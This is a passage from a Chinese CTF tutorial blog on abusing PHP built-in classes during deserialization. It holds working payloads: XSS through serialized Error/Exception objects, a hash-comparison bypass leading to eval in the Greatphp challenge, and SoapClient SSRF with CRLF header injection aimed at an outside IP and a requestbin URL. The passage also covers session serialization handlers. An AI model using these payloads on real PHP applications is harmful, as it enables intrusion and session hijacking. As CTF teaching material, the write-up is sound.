<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#O:5:&quot;Error&quot;:7:&#123;s:10:&quot;*message&quot;;s:29:&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;;s:13:&quot;Errorstring&quot;;s:0:&quot;&quot;;s:7:&quot;*code&quot;;i:0;s:7:&quot;*file&quot;;s:57:&quot;C:\Users\lenovo\AppData\Local\Temp\tempCodeRunnerFile.php&quot;;s:7:&quot;*line&quot;;i:2;s:12:&quot;Errortrace&quot;;a:0:&#123;&#125;s:15:&quot;Errorprevious&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>

<p>如果直接使用反序列化，这里可以造成xss</p>
<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230919194756638.png" alt="image-20230919194756638"></p>
<p>显然是直接被合并到网页上解析了，造成了这里弹窗</p>
<h3 id="2-exception类"><a href="#2-exception类" class="headerlink" title="2.exception类"></a>2.exception类</h3><p>适用于php5、7版本，同时开启报错</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss2&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们查看exception类的属性</p>
<p>发现和error类类似，由于内部的函数大部分被封装无法看到，这里猜测出现问题的是同一个函数</p>
<h3 id="3-Error-Exception-内置类绕过哈希比较"><a href="#3-Error-Exception-内置类绕过哈希比较" class="headerlink" title="3.Error&#x2F;Exception 内置类绕过哈希比较"></a>3.Error&#x2F;Exception 内置类绕过哈希比较</h3><p>error类是所有php内部错误类的基类 从php7开始被引入</p>
<p>exception类是所有异常的类，从php5开始被引入</p>
<p>这两个都存在__tostring方法</p>
<p>触发tostring方法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span><span class="comment">//将$a作为echo的参数输出触发tostring()</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230919202107330.png" alt="image-20230919202107330"></p>
<p>假设有以下函数</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);<span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);<span class="comment">//注意这是同一行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;a!=b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>));<span class="comment">//这里输出是true</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果这样写</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;payload&quot;</span>,<span class="number">2</span>);<span class="comment">//这里是不y一行</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;a!=b&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span><span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>)===<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>));<span class="comment">//这里输出的是false</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>__toString 返回的数据包含当前行号，所以返回相同的错误方法</p>
<p>Exception 类与 Error 的使用和结果完全一样，只不过 Exception 类适用于PHP 5和7，而 Error 只适用于 PHP 7</p>
<p>这里遇到就可以绕过hash</p>
<p>举个例子</p>
<h4 id="2020-极客大挑战-Greatphp"><a href="#2020-极客大挑战-Greatphp" class="headerlink" title="[2020 极客大挑战]Greatphp"></a>[2020 极客大挑战]Greatphp</h4><p>上来给了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>( (<span class="variable language_">$this</span>-&gt;syc != <span class="variable language_">$this</span>-&gt;lover) &amp;&amp; (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;syc) === <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;lover)) &amp;&amp; (<span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;syc)=== <span class="title function_ invoke__">sha1</span>(<span class="variable">$this</span>-&gt;lover)) )&#123;</span><br><span class="line">		   <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\&lt;\?php|\(|\)|\&quot;|\&#x27;/&quot;</span>, <span class="variable">$this</span>-&gt;syc, <span class="variable">$match</span>))&#123;</span><br><span class="line">			   <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;syc);</span><br><span class="line">		   &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			   <span class="keyword">die</span>(<span class="string">&quot;Try Hard !!&quot;</span>);</span><br><span class="line">		   &#125; </span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">SYCLOVER</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$syc</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="variable">$payload</span>=<span class="keyword">new</span> *SYCLOVER*();</span><br><span class="line"> <span class="variable">$str</span> = <span class="string">&quot;?&gt;&lt;?=include~&quot;</span>.<span class="title function_ invoke__">urldecode</span>(<span class="string">&quot;%D0%99%93%9E%98&quot;</span>).<span class="string">&quot;?&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$payload</span>-&gt;lover=<span class="keyword">new</span> *<span class="built_in">Error</span>*(<span class="variable">$str</span>,<span class="number">2</span>);<span class="variable">$payload</span>-&gt;syc=<span class="keyword">new</span> *<span class="built_in">Error</span>*(<span class="variable">$str</span>,<span class="number">1</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$payload</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>尝试md5和sha的时候会触发tostring，达到相同的效果，从而达到绕过</p>
<h3 id="4-使用-SoapClient-类进行-SSRF"><a href="#4-使用-SoapClient-类进行-SSRF" class="headerlink" title="4.使用 SoapClient 类进行 SSRF"></a>4.使用 SoapClient 类进行 SSRF</h3><p>PHP 的内置类 SoapClient 是一个专门用来访问web服务的类，可以提供一个基于SOAP协议访问Web服务的 PHP 客户端</p>
<p>我们观察类内部</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">SoapClient &#123;</span><br><span class="line">	<span class="comment">/* 方法 */</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$wsdl</span> , <span class="keyword">array</span> <span class="variable">$options</span> = [] )</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__call</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> ) : <span class="keyword">mixed</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__doRequest</span> ( <span class="keyword">string</span> <span class="variable">$request</span> , <span class="keyword">string</span> <span class="variable">$location</span> , <span class="keyword">string</span> <span class="variable">$action</span> , <span class="keyword">int</span> <span class="variable">$version</span> , <span class="keyword">bool</span> <span class="variable">$oneWay</span> = <span class="literal">false</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getCookies</span> ( ) : <span class="keyword">array</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getFunctions</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequest</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastRequestHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponse</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getLastResponseHeaders</span> ( ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__getTypes</span> ( ) : <span class="keyword">array</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__setCookie</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">string</span>|<span class="literal">null</span> <span class="variable">$value</span> = <span class="literal">null</span> ) : <span class="keyword">void</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__setLocation</span> ( <span class="keyword">string</span> <span class="variable">$location</span> = <span class="string">&quot;&quot;</span> ) : <span class="keyword">string</span>|<span class="literal">null</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__setSoapHeaders</span> ( SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$headers</span> = <span class="literal">null</span> ) : <span class="keyword">bool</span></span><br><span class="line">	<span class="keyword">public</span> <span class="title function_ invoke__">__soapCall</span> ( <span class="keyword">string</span> <span class="variable">$name</span> , <span class="keyword">array</span> <span class="variable">$args</span> , <span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$options</span> = <span class="literal">null</span> , SoapHeader|<span class="keyword">array</span>|<span class="literal">null</span> <span class="variable">$inputHeaders</span> = <span class="literal">null</span> , <span class="keyword">array</span> &amp;<span class="variable">$outputHeaders</span> = <span class="literal">null</span> ) : <span class="keyword">mixed</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</span></span><br><span class="line"><span class="comment">第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</span></span><br><span class="line"><span class="comment">第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间。*/</span></span><br></pre></td></tr></table></figure>

<p>如果前面设置成null，后边设置成target_url，就可以造成ssrf</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://47.120.0.245:3232/&#x27;</span>, <span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;ssrf&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>如果这里存在CRLF的漏洞，通过恶意的换行可以注入恶意的cookies和html代码</p>
<p>就可以注入一些恶意的语句</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&#x27;http://requestbin.net/r/doe3ps5d&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>, <span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;WHOAMI\r\nCookie: PHPSESSID=tcjr6nadpk3md7jbgioa6elfk4&quot;</span>, <span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;test&#x27;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="variable">$c</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$c</span>-&gt;<span class="title function_ invoke__">a</span>();    <span class="comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>由于 Content-Type 在 User-Agent 的下面，所以我们可以通过 SoapClient 来设置 User-Agent ，将原来的 Content-Type 挤下去，从而再插入一个新的 Content-Type 。</p>
<h4 id="LCTF-2018-bestphp’s-revenge"><a href="#LCTF-2018-bestphp’s-revenge" class="headerlink" title="[LCTF 2018]bestphp’s revenge"></a>[LCTF 2018]bestphp’s revenge</h4><p>上来给了源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;implode&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>], <span class="variable">$_POST</span>);</span><br><span class="line"><span class="comment">/*1、第一个参数是回调函数名称，可以是内置函数，第二个参数是函数的参数</span></span><br><span class="line"><span class="comment">2、传入的是数组的时候，会将第一个参数视为一个类的名称，第二个参数是类中的方法(可以不存在)*/</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">&#125;<span class="comment">//通过get设置session的内容</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);<span class="comment">//输出session的值</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="string">&#x27;welcome_to_the_lctf2018&#x27;</span>);<span class="comment">//这里已经是数组了，显然会调用类里面的函数，</span></span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$b</span>, <span class="variable">$a</span>);<span class="comment">//传入session这个类</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>扫描出flag.php</p>
<p>告诉我们只有用127.0.0.1去输出flag，添加到session上面</p>
<p>这里需要session反序列化的知识</p>
<p>显然这里需要写入恶意的序列化的值</p>
<h3 id="php-session反序列化"><a href="#php-session反序列化" class="headerlink" title="php session反序列化"></a>php session反序列化</h3><p>session是会话控制，当开始一个会话时，PHP 会尝试从请求中查找会话 ID （通常通过会话 <code>cookie</code>），如果发现请求的<code>Cookies</code>、<code>Get</code>、<code>Pos</code>t中不存在<code>session id</code>，PHP 就会自动调用<code>php_session_create_id</code>函数创建一个新的会话，并且在<code>http response</code>中通过<code>set-cookie</code>头部发送给客户端保存。</p>
<p>注册一个session</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>])) &#123;</span><br><span class="line">  <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="string">&#x27;AsaL1n&#x27;</span> ;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到生成了一个session</p>
<p>然后将session储存到对话控制中去</p>
<p>以下是一些简单的session设置</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">session.gc_divisor</span><br><span class="line">php session垃圾回收机制相关配置</span><br><span class="line">session.sid_bits_per_character</span><br><span class="line">指定编码的会话ID字符中的位数</span><br><span class="line">session.save_path=<span class="string">&quot;&quot;</span></span><br><span class="line">该配置主要设置session的存储路径</span><br><span class="line">session.save_handler=<span class="string">&quot;&quot;</span></span><br><span class="line">该配置主要设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数</span><br><span class="line">session.use_strict_mode</span><br><span class="line">严格会话模式，严格会话模式不接受未初始化的会话ID并重新生成会话ID</span><br><span class="line">session.use_cookies</span><br><span class="line">指定是否在客户端用 cookie 来存放会话 ID，默认启用</span><br><span class="line">session.cookie_secure</span><br><span class="line">指定是否仅通过安全连接发送 cookie，默认关闭</span><br><span class="line">session.use_only_cookies</span><br><span class="line">指定是否在客户端仅仅使用cookie来存放会话 ID，启用的话，可以防止有关通过 URL 传递会话 ID 的攻击</span><br><span class="line">session.name</span><br><span class="line">指定会话名以用做 cookie 的名字，只能由字母数字组成，默认为 PHPSESSID</span><br><span class="line">session.auto_start</span><br><span class="line">指定会话模块是否在请求开始时启动一个会话，默认值为 <span class="number">0</span>，不启动</span><br><span class="line">session.cookie_lifetime</span><br><span class="line">指定了发送到浏览器的 cookie 的生命周期，单位为秒，值为 <span class="number">0</span> 表示“直到关闭浏览器”。默认为 <span class="number">0</span></span><br><span class="line">session.cookie_path</span><br><span class="line">指定要设置会话cookie 的路径，默认为 /</span><br><span class="line">session.cookie_domain</span><br><span class="line">指定要设置会话cookie 的域名，默认为无，表示根据 cookie 规范产生cookie的主机名</span><br><span class="line">session.cookie_httponly</span><br><span class="line">将Cookie标记为只能通过HTTP协议访问，即无法通过脚本语言（例如JavaScript）访问Cookie，此设置可以有效地帮助通过XSS攻击减少身份盗用</span><br><span class="line">session.serialize_handler</span><br><span class="line">定义用来序列化/反序列化的处理器名字，默认使用php，还有其他引擎，且不同引擎的对应的session的存储方式不相同，具体可见下文所述</span><br><span class="line">session.gc_probability</span><br><span class="line">该配置项与 session.gc_divisor 合起来用来管理 garbage collection，即垃圾回收进程启动的概率</span><br><span class="line">session.gc_divisor</span><br><span class="line">该配置项与session.gc_probability合起来定义了在每个会话初始化时启动垃圾回收进程的概率</span><br><span class="line">session.gc_maxlifetim</span><br><span class="line">指定过了多少秒之后数据就会被视为“垃圾”并被清除，垃圾搜集可能会在session启动的时候开始（ 取决于session.gc_probability 和 session.gc_divisor）</span><br><span class="line">session.referer_check</span><br><span class="line">包含有用来检查每个 HTTP Referer的子串。如果客户端发送了Referer信息但是在其中并未找到该子串，则嵌入的会话 ID 会被标记为无效。默认为空字符串</span><br><span class="line">session.cache_limiter</span><br><span class="line">指定会话页面所使用的缓冲控制方法（none/nocache/<span class="keyword">private</span>/private_no_expire/<span class="keyword">public</span>）。默认为 nocache</span><br><span class="line">session.cache_expire</span><br><span class="line">以分钟数指定缓冲的会话页面的存活期，此设定对nocache缓冲控制方法无效。默认为 <span class="number">180</span></span><br><span class="line">session.use_trans_sid</span><br><span class="line">指定是否启用透明 SID 支持。默认禁用</span><br><span class="line">session.sid_length</span><br><span class="line">配置会话ID字符串的长度。 会话ID的长度可以在<span class="number">22</span>到<span class="number">256</span>之间。默认值为<span class="number">32</span>。</span><br><span class="line">session.trans_sid_tags</span><br><span class="line">指定启用透明sid支持时重写哪些HTML标签以包括会话ID</span><br><span class="line">session.trans_sid_hosts</span><br><span class="line">指定启用透明sid支持时重写的主机，以包括会话ID</span><br><span class="line">session.sid_bits_per_character</span><br><span class="line">配置编码的会话ID字符中的位数</span><br><span class="line">session.upload_progress.enabled</span><br><span class="line">启用上传进度跟踪，并填充$ _SESSION变量， 默认启用。</span><br><span class="line">session.upload_progress.cleanup</span><br><span class="line">读取所有POST数据（即完成上传）后，立即清理进度信息，默认启用</span><br><span class="line">session.upload_progress.prefix</span><br><span class="line">配置$ _SESSION中用于上传进度键的前缀，默认为upload_progress_</span><br><span class="line">session.upload_progress.name</span><br><span class="line">$ _SESSION中用于存储进度信息的键的名称，默认为PHP_SESSION_UPLOAD_PROGRESS</span><br><span class="line">session.upload_progress.freq</span><br><span class="line">定义应该多长时间更新一次上传进度信息</span><br><span class="line">session.upload_progress.min_freq</span><br><span class="line">更新之间的最小延迟</span><br><span class="line">session.lazy_write</span><br><span class="line">配置会话数据在更改时是否被重写，默认启用</span><br></pre></td></tr></table></figure>

<p>session在停止加载之后会储存到文件里面，文件的名字由sessionid决定</p>
<p>存储机制是由<code>session.serialize_handler</code>来决定的</p>
<p>文件的内容是序列化之后的内容</p>
<p>一般情况之下存在三种不同的引擎</p>
<table>
<thead>
<tr>
<th>php处理引擎</th>
<th>储存的方式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td>键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize（php版本大于5.5.4）</td>
<td>经过serialize()函数序列化处理的<strong>数组</strong>直接使用 <code>serialize/unserialize</code>函数，并且不会有<code>php</code>和 <code>php_binary</code>所具有的限制。 使用较旧的序列化处理器导致<code>$_SESSION</code> 的索引既不能是数字也不能包含特殊字符(&#96;</td>
</tr>
</tbody></table>
<h4 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h4><p>当输入</p>
